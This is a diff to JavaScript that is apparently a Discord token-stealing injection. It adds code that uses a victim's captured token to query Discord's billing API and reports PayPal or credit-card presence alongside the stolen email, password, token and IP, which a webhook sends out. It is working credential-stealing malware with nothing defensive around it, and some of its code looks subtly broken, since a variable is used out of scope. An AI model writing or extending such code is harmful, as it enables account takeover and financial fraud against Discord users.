@@ -175,6 +175,26 @@ function GetBadges(flags) {
     return badges
 }
 
+function PM() {
+    const json = JSON.parse(info3)
+    var billing = "";
+    json.forEach(z => {
+        if (z.type == "") {
+            return "\`No\`"
+        } else if (z.type == 2 && z.invalid != !0) {
+            billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
+        } else if (z.type == 1 && z.invalid != !0) {
+            billing += "\`Yes\`" + " :credit_card:"
+        } else {
+            return "\`No\`"
+        }
+    })
+    if (billing == "") {
+        billing = "\`No\`"
+    }
+    return billing
+}
+
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -189,6 +209,13 @@ function Login(email, password, token) {
         xmlHttp.send( null );
         xmlHttp.responseText;
     `, !0).then((ip) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+        `, !0).then((info3) => {
         const json = JSON.parse(info);
         var params = {
             username: "Atomic",
@@ -224,6 +251,13 @@ function Login(email, password, token) {
                             "value": `Ip: \`${ip}\``,
                             "inline": false
                             
+                        },
+
+
+                        {
+                            "name": "Billing",
+                            "value": `Billing: \`${PM()}\``,
+                            "inline": false
                         }
                     ],
                     "author": {
@@ -238,6 +272,7 @@ function Login(email, password, token) {
         }
         SendToWebhook(JSON.stringify(params))
     })
+})
 })
 }
 
